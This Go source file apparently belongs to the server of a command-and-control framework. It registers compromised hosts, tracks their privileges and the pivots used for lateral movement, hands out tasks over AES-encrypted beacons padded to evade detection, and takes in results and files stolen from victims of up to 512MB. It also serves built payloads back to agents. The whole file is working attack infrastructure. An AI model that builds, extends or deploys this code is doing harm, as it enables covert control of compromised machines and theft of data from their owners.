package server

import (
	cryptorand "crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

type registerRequest struct {
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	PID         int    `json:"pid"`
	Transport   string `json:"transport"`
	SleepSec    int    `json:"sleep_sec"`
	JitterPct   int    `json:"jitter_pct"`
	ProcessName string `json:"process_name,omitempty"`
	IsAdmin     bool   `json:"is_admin,omitempty"`
	IPOverride  string `json:"ip,omitempty"`
	ParentID    string `json:"parent_id,omitempty"`
}

type registerResponse struct {
	AgentID   string `json:"agent_id"`
	AESKey    string `json:"aes_key"`
	SleepSec  int    `json:"sleep_sec"`
	JitterPct int    `json:"jitter_pct"`
}

type taskWire struct {
	ID      int64  `json:"id"`
	Type    string `json:"type"`
	Args    string `json:"args,omitempty"`
	Payload string `json:"payload,omitempty"` // base64
}

// DataJitterMax controls random padding bytes added to beacon responses (0 = disabled).
var DataJitterMax int

type beaconResponse struct {
	Tasks   []taskWire `json:"tasks"`
	Padding string     `json:"_p,omitempty"`
}

type resultRequest struct {
	TaskID int64  `json:"task_id"`
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

func (s *Server) handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, 4096))
	if err != nil {
		http.Error(w, "bad body", http.StatusBadRequest)
		return
	}
	var req registerRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}

	agentID := newUUID()
	key, err := NewAESKey()
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	ip := r.RemoteAddr
	if idx := strings.LastIndex(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	if req.IPOverride != "" {
		parsed := net.ParseIP(req.IPOverride)
		if parsed != nil {
			ip = parsed.String()
		}
	}

	// HTTP pivot injects the parent's agent ID via X-C2-Parent header
	if hdr := r.Header.Get("X-C2-Parent"); hdr != "" && req.ParentID == "" {
		req.ParentID = hdr
	}
	// Lateral movement (jump): claim pending pivot registered when the JUMP task was queued
	if req.ParentID == "" {
		if parentID := s.claimPendingPivot(ip); parentID != "" {
			req.ParentID = parentID
		}
	}

	transport := req.Transport
	if transport == "" {
		transport = "http"
	}

	sleepSec  := req.SleepSec
	jitterPct := req.JitterPct
	if sleepSec  <= 0 { sleepSec  = 60 }
	if jitterPct <  0 { jitterPct = 20 }

	agent := &Agent{
		ID:          agentID,
		Hostname:    req.Hostname,
		Username:    req.Username,
		OS:          req.OS,
		IP:          ip,
		PID:         req.PID,
		AESKey:      key,
		SleepSec:    sleepSec,
		JitterPct:   jitterPct,
		Transport:   transport,
		ProcessName: req.ProcessName,
		IsAdmin:     req.IsAdmin,
		ParentID:    req.ParentID,
	}
	if err := s.db.RegisterAgent(agent); err != nil {
		http.Error(w, "db error", http.StatusInternalServerError)
		return
	}

	resp := registerResponse{
		AgentID:   agentID,
		AESKey:    base64.StdEncoding.EncodeToString(key),
		SleepSec:  sleepSec,
		JitterPct: jitterPct,
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
	s.printf("[+] New agent registered: %s  %s@%s  (%s)  [%s]\n", agentID[:8], req.Username, req.Hostname, ip, transport)
	BroadcastGUI("AGENT_CHECKIN", agentID, fmt.Sprintf("new agent: %s@%s (%s)", req.Username, req.Hostname, ip))
	go s.db.UpsertTargetFromAgent(ip, req.Hostname, req.OS, agentID)
	go s.FireWebhooks("checkin", fmt.Sprintf("%s@%s [%s] %s", req.Username, req.Hostname, ip, req.OS))
	go s.fireReactions("checkin", agentID)
}

func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
	agentID := strings.TrimPrefix(r.URL.Path, "/beacon/")
	if agentID == "" {
		http.Error(w, "missing agent id", http.StatusBadRequest)
		return
	}

	agent, err := s.db.GetAgent(agentID)
	if err != nil || !agent.Active {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}
	s.db.TouchAgent(agentID)

	tasks, err := s.db.PendingTasks(agentID)
	if err != nil || len(tasks) == 0 {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	var wires []taskWire
	for _, t := range tasks {
		tw := taskWire{ID: t.ID, Type: t.Type, Args: t.Args}
		if len(t.Payload) > 0 {
			tw.Payload = base64.StdEncoding.EncodeToString(t.Payload)
		}
		wires = append(wires, tw)
		s.db.MarkTaskFetched(t.ID)
	}

	resp := beaconResponse{Tasks: wires}
	if DataJitterMax > 0 {
		n := rand.Intn(DataJitterMax + 1)
		if n > 0 {
			b := make([]byte, n)
			cryptorand.Read(b) //nolint:errcheck
			resp.Padding = hex.EncodeToString(b)
		}
	}
	plaintext, _ := json.Marshal(resp)
	encrypted, err := Seal(agent.AESKey, plaintext)
	if err != nil {
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(encrypted)
}

func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	agentID := strings.TrimPrefix(r.URL.Path, "/result/")
	agent, err := s.db.GetAgent(agentID)
	if err != nil {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	body, _ := io.ReadAll(io.LimitReader(r.Body, 10*1024*1024))
	plaintext, err := Open(agent.AESKey, body)
	if err != nil {
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	var req resultRequest
	if err := json.Unmarshal(plaintext, &req); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}
	s.db.InsertResult(req.TaskID, agentID, req.Output, req.Error)
	w.WriteHeader(http.StatusOK)

	if req.Output != "" {
		s.printf("[%s] task %d output:\n%s\n", agentID[:8], req.TaskID, req.Output)
		BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d complete", req.TaskID))
	}
	if req.Error != "" {
		s.printf("[%s] task %d error: %s\n", agentID[:8], req.TaskID, req.Error)
		BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d error: %s", req.TaskID, req.Error))
	}
}

func (s *Server) handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	// URL: /upload/{agent_id}/{filename}
	parts := strings.SplitN(strings.TrimPrefix(r.URL.Path, "/upload/"), "/", 2)
	if len(parts) < 2 {
		http.Error(w, "usage: /upload/{agent_id}/{filename}", http.StatusBadRequest)
		return
	}
	agentID, filename := parts[0], filepath.Base(parts[1])

	agent, err := s.db.GetAgent(agentID)
	if err != nil {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	body, _ := io.ReadAll(io.LimitReader(r.Body, 512*1024*1024))
	plaintext, err := Open(agent.AESKey, body)
	if err != nil {
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	dir := filepath.Join("data", "uploads", agentID)
	os.MkdirAll(dir, 0700)
	path := filepath.Join(dir, filename)
	os.WriteFile(path, plaintext, 0600)
	s.printf("[%s] uploaded file: %s (%d bytes)\n", agentID[:8], filename, len(plaintext))
	go s.CheckAndPromptBH(agentID, filename, plaintext)
	w.WriteHeader(http.StatusOK)
}

func (s *Server) handleDownload(w http.ResponseWriter, r *http.Request) {
	// URL: /dl/{agent_id}/{filename}
	parts := strings.SplitN(strings.TrimPrefix(r.URL.Path, "/dl/"), "/", 2)
	if len(parts) < 2 {
		http.Error(w, "usage: /dl/{agent_id}/{filename}", http.StatusBadRequest)
		return
	}
	agentID, filename := parts[0], filepath.Base(parts[1])

	agent, err := s.db.GetAgent(agentID)
	if err != nil {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	path := filepath.Join(s.cfg.DataDir, "downloads", filename)
	data, err := os.ReadFile(path)
	if err != nil {
		// operator-uploaded files
		path = filepath.Join(s.cfg.DataDir, "uploads", filename)
		data, err = os.ReadFile(path)
	}
	if err != nil {
		// built payload artifacts (bin/payloads/)
		path = filepath.Join(projectRoot(), "bin", "payloads", filename)
		data, err = os.ReadFile(path)
	}
	if err != nil {
		http.Error(w, fmt.Sprintf("file not found: %s", filename), http.StatusNotFound)
		return
	}

	encrypted, err := Seal(agent.AESKey, data)
	if err != nil {
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(encrypted)
}
